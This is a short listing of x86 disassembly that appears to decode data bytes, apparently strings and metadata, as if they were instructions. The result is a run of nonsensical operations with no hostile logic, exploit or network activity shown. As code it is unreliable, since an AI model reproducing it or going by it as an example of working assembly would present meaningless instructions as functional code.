  420fc3:	push   ebx
  420fc4:	sub    eax,0x6ea26e35
  420fc9:	dec    eax
  420fca:	or     DWORD PTR [edx-0x5d],ecx
  420fcd:	adc    eax,DWORD PTR [ecx+edi*1+0xefe0186]
  420fd4:	add    DWORD PTR [eax],eax
  420fd6:	add    BYTE PTR [eax],al
  420fd8:	inc    ebx
  420fd9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  420fdd:	jb     0x421051
  420fdf:	outs   dx,BYTE PTR gs:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
